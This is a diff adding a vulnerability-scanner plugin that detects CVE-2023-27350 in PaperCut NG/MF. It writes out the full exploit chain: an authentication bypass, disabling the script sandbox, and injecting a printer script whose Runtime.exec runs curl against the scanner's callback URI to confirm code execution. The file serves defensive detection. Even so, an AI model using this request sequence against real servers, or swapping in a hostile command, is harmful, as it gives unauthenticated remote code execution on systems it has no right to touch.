@@ -1,0 +1,320 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "PapercutNgMf_CVE_2023_27350"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "Isaac_GC (isaac@nu-that.us) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2023_27350"
+  }
+  title: "Papercut NG/MF Authentication Bypass and RCE"
+  description: 
+    "This vulnerability allows remote attackers to bypass authentication"
+    " on affected installations of PaperCut NG/MF."
+    " Authentication is not required to exploit this vulnerability."
+    " The specific flaw exists within the SetupCompleted class and the"
+    " issue results from improper access control."
+    " An attacker can leverage this vulnerability to bypass authentication"
+    " and execute arbitrary code in the context of SYSTEM (Windows) "
+    "or Root/Papercut User (Linux)."
+  recommendation:
+    "Update to versions that are at least 20.1.7, 21.2.11, 22.0.9, or any later"
+    " version."
+  severity: CRITICAL
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-27350"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_papercut"
+  http_request: {
+    method: GET
+    uri: "/app?service=page/SetupCompleted"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: "Configuration Wizard : Setup Complete" }
+      }
+      extract_any: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "JSESSIONID=([a-zA-Z0-9.]+);"
+            variable_name: "COOKIE"
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "complete_setup"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/SetupCompleted/$Form&sp=S0&Form0=$Hidden,analyticsEnabled,$Submit&$Hidden=true&$Submit=Login"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      extract_any: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "JSESSIONID=([a-zA-Z0-9.]+);"
+            variable_name: "COOKIE"
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "nav_settings_1"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/ConfigEditor/quickFindForm&sp=S0&Form0=$TextField,doQuickFind,clear&$TextField=print-and-device.script.enable&doQuickFind=Go"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      http_status: 200
+      extract_any: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "JSESSIONID=([a-zA-Z0-9.]+);"
+            variable_name: "COOKIE"
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "update_settings_1"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/ConfigEditor/$Form&sp=S1&Form1=$TextField$0,$Submit,$Submit$0&$TextField$0=Y&$Submit=Update"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      http_status: 200
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "nav_settings_2"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/ConfigEditor/quickFindForm&sp=S0&Form0=$TextField,doQuickFind,clear&$TextField=print.script.sandboxed&doQuickFind=Go"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      http_status: 200
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "update_settings_2"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/ConfigEditor/$Form&sp=S1&Form1=$TextField$0,$Submit,$Submit$0&$TextField$0=N&$Submit=Update"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      http_status: 200
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "nav_printers"
+  http_request: {
+    method: GET
+    uri: "/app?service=page/PrinterList"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "nav_first_printer"
+  http_request: {
+    method: GET
+    uri: "/app?service=direct/1/PrinterList/selectPrinter&sp=l1001"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    response: {
+      http_status: 200
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "nav_scripting_tab"
+  http_request: {
+    method: GET
+    uri: "/app?service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "execute_script"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/PrinterDetails/$PrinterDetailsScript.$Form&sp=S0&Form0=printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1&printerId=l1001&enablePrintScript=on&scriptBody=function printJobHook(inputs, actions) {}\r\njava.lang.Runtime.getRuntime().exec('curl {{ T_CBS_URI }}');&$Submit$1=Apply"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+    #"complete_setup",
+    #"nav_settings_1",
+    #"update_settings_1",
+    #"nav_settings_2",
+    #"update_settings_2",
+    #"nav_printers",
+    #"nav_first_printer",
+    #"nav_scripting_tab",
+    #"execute_script",
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_papercut",
+    "complete_setup",
+    "nav_settings_1",
+    "update_settings_1",
+    "nav_settings_2",
+    "update_settings_2",
+    "nav_printers",
+    "nav_first_printer",
+    "nav_scripting_tab",
+    "execute_script",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
